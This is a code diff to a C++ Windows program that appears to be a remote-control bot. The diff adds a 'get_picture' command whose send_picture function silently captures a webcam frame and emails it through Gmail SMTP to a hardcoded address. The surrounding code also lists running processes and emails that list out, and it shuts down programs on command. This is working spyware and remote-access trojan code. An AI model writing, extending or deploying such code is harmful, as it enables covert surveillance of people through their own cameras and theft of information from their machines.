@@ -1,12 +1,14 @@
 #include <iostream>
 #include <string>
 #include <curl/curl.h>
+#include <opencv2/opencv.hpp>
 #include <vector>
 #include <regex>
 #include <windows.h>
 #include <shellapi.h>
 #include <sstream>
 #include <fstream>
+#include <windows.h>
 #include <cstdint>
 #include <cstdlib>    // for system()
 #include <algorithm>  // for remove()
@@ -109,53 +111,99 @@ void list_programs() {
   cout << "Process list written to: " << filename << endl;
 }
 
-void send_email_with_attachment(const string& toEmail, const string& subject, const string& body, const string& filepath) {
-  CURL* curl = curl_easy_init();
-  if (!curl) {
-    cerr << "Failed to initialize curl" << endl;
+void send_email_with_attachment(const std::string& toEmail, const std::string& subject, const std::string& body, const std::string& filepath) {
+    CURL* curl = curl_easy_init();
+    if (!curl) {
+        std::cerr << "Failed to initialize curl" << std::endl;
+        return;
+    }
+
+    struct curl_slist* recipients = nullptr;
+    curl_mime* mime = curl_mime_init(curl);
+    curl_mimepart* part = nullptr;
+
+    curl_easy_setopt(curl, CURLOPT_USERNAME, gmail_username.c_str());
+    curl_easy_setopt(curl, CURLOPT_PASSWORD, app_password.c_str());
+    curl_easy_setopt(curl, CURLOPT_URL, "smtps://smtp.gmail.com:465");
+    curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
+    curl_easy_setopt(curl, CURLOPT_CAINFO, ca_bundle_path.c_str());
+    curl_easy_setopt(curl, CURLOPT_MAIL_FROM, gmail_username.c_str());
+
+    recipients = curl_slist_append(recipients, toEmail.c_str());
+    curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
+
+    // Create email headers part
+    part = curl_mime_addpart(mime);
+    std::string headers = "To: " + toEmail + "\r\n"
+                         "From: " + gmail_username + "\r\n"
+                         "Subject: " + subject + "\r\n"
+                         "MIME-Version: 1.0\r\n";
+    curl_mime_data(part, headers.c_str(), CURL_ZERO_TERMINATED);
+    curl_mime_type(part, "text/plain");
+
+    // Add body part
+    part = curl_mime_addpart(mime);
+    curl_mime_data(part, body.c_str(), CURL_ZERO_TERMINATED);
+    curl_mime_type(part, "text/plain");
+
+    // Add attachment part
+    part = curl_mime_addpart(mime);
+    curl_mime_filedata(part, filepath.c_str());
+    curl_mime_filename(part, "captured_photo.jpg");
+    curl_mime_type(part, "image/jpeg");
+    curl_mime_encoder(part, "base64");  // Ensure base64 encoding
+
+    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
+    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
+
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
+    } else {
+        std::cout << "Email sent successfully!" << std::endl;
+    }
+
+    curl_mime_free(mime);
+    curl_slist_free_all(recipients);
+    curl_easy_cleanup(curl);
+}
+
+void send_picture() {
+  char temp_path[MAX_PATH];
+  GetTempPathA(MAX_PATH, temp_path);
+
+  string image_path = string(temp_path) + "captured_photo.jpg";
+
+  // Open default camera (0)
+  cv::VideoCapture cap(0);
+  if (!cap.isOpened()) {
+    cerr << "Failed to open webcam!" << endl;
     return;
   }
 
-  struct curl_slist* recipients = nullptr;
-  curl_mime* mime;
-  curl_mimepart* part;
+  cv::Mat frame;
+  cap >> frame;
 
-  curl_easy_setopt(curl, CURLOPT_USERNAME, gmail_username.c_str());
-  curl_easy_setopt(curl, CURLOPT_PASSWORD, app_password.c_str());
-  curl_easy_setopt(curl, CURLOPT_URL, "smtps://smtp.gmail.com:465");
+  if (frame.empty()) {
+    cerr << "Failed to capture image!" << endl;
+    return;
+  }
 
-  curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
-  curl_easy_setopt(curl, CURLOPT_CAINFO, ca_bundle_path.c_str());
+  // Save image to file
+  bool saved = cv::imwrite(image_path, frame);
+  if (!saved) {
+    cerr << "Failed to save image!" << endl;
+    return;
+  }
+  cout << "Image saved successfully to: " << image_path << endl;
 
-  curl_easy_setopt(curl, CURLOPT_MAIL_FROM, ("<" + gmail_username + ">").c_str());
-
-  recipients = curl_slist_append(recipients, ("<" + toEmail + ">").c_str());
-  curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
-
-  mime = curl_mime_init(curl);
-
-  // Body part
-  part = curl_mime_addpart(mime);
-  curl_mime_data(part, body.c_str(), CURL_ZERO_TERMINATED);
-
-  // Attachment part
-  part = curl_mime_addpart(mime);
-  curl_mime_filedata(part, filepath.c_str());
-  curl_mime_filename(part, "process_list.txt");
-
-  curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
-  curl_easy_setopt(curl, CURLOPT_MAIL_AUTH, gmail_username.c_str());
-  curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
-
-  CURLcode res = curl_easy_perform(curl);
-  if (res != CURLE_OK)
-    cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << endl;
-  else
-    cout << "Email with attachment sent successfully!" << endl;
-
-  curl_mime_free(mime);
-  curl_slist_free_all(recipients);
-  curl_easy_cleanup(curl);
+  // Send it via email
+  send_email_with_attachment(
+    "serverbottestmmt@gmail.com",
+    "Webcam Photo",
+    "Here is a photo taken from the webcam.",
+    image_path
+  );
 }
 
 
@@ -229,7 +277,11 @@ void execute_command(const string& command) {
     if (!proc.empty()) {
       shutdown_program(proc);
     }
-  } else if (trimmed_cmd.find("list_program") == 0) {
+  }else if(trimmed_cmd.find("get_picture") == 0)
+  {
+    send_picture();
+  } 
+  else if (trimmed_cmd.find("list_program") == 0) {
   list_programs();
   Sleep(1000);
 ifstream test_file("process_list.txt");
